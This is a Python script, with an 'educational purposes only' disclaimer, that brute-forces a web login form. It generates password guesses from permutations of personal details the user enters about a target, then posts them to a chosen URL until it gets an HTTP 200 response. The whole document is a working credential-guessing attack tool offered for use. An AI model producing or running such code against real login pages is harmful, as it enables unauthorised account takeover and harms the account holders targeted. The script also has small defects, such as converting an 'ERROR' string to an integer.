# DISCLAIMER:
# This script is provided for educational purposes and ethical hacking/penetration testing only.
# Unauthorized use of this script on any system you do not own or have explicit permission to test is illegal.
# The author do not assume any responsibility for misuse of this tool.
import requests
import itertools
# post a request and return the status code
def post_request(URL, PARAMS):
    try:
        # sending get request and saving the response as response object
        r = requests.post(url = URL, data = PARAMS)
        return r.status_code
    except:
        return "ERROR"

def main():
    URL = input("Enter URL: ")
    target_username = input("Target username: ")
    target_information_list = []
    print("Enter information, words, numbers or symbols to be added to the target information list, (enter empty string to end your input): ")
    while True:
        user_input = input()
        if not user_input:
            break
        else:
            target_information_list.append(user_input)

    try_list =[]
    #add passwords to the list for brute force with 1, 2, 3, 4, 5 combinations from user entered target info list
    for i in range(1, 6):
        for comb in itertools.permutations(target_information_list, i):
            tmp = "".join(comb)
            try_list.append(tmp)

    #defining a params dict for the parameters to be sent to the API
    PARAMS = {"username": target_username, "password": ""}
    # make a request to the url
    status = post_request(URL, PARAMS)

    pass_found = ""
    #brute force loop
    for i in range(len(try_list)):
        PARAMS['password'] = try_list[i]
        status = post_request(URL, PARAMS)
        if int(status) == 200:
            pass_found = try_list[i]
            print(f"Access granted.\nThe password found is: {pass_found}")
            break

    if int(status) != 200:
        print(f"Password not found, maybe try to enter more items to the target information list?")

if __name__ == "__main__":
    main()
